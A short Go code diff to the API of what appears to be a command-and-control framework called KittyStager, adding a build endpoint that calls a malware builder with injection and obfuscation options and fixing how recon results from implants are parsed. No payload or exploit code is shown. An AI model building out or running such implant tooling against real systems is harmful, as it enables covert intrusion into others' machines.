@@ -1,6 +1,7 @@
 package api
 
 import (
+	builder "KittyStager/internal/build"
 	"KittyStager/internal/config"
 	"KittyStager/internal/crypto"
 	"KittyStager/internal/kitten"
@@ -66,6 +67,7 @@ func Api(config *config.Config) error {
 	back.GET("task/:name", backGetTasks)
 	back.GET("result/:name", backGetResult)
 	back.POST("task/:name", backCreateTask)
+	back.GET("build", backGetBuild)
 	//frontend
 	g.Go(func() error {
 		fmt.Printf("[*] Listening on %s://%s\n", conf.GetProtocol(), addr)
@@ -144,7 +146,7 @@ func frontPostResult(c *gin.Context) {
 	switch t.Tag {
 	case "recon":
 		r := recon.NewRecon("", "", "", "", "", "", 0)
-		err = r.UnmarshallTask(t.Payload)
+		err = r.UnmarshallRecon(t.Payload)
 		if err != nil {
 			return
 		}
@@ -238,4 +240,9 @@ func backGetResult(c *gin.Context) {
 	}
 	c.IndentedJSON(200, t)
 	Kittens[name].SetResult(nil)
+}
+
+func backGetBuild(c *gin.Context) {
+	malware := builder.NewMalware(conf.GetExecType(), conf.GetInjection(), conf.GetObfuscation())
+	malware.Build("output/kitten.go")
 }
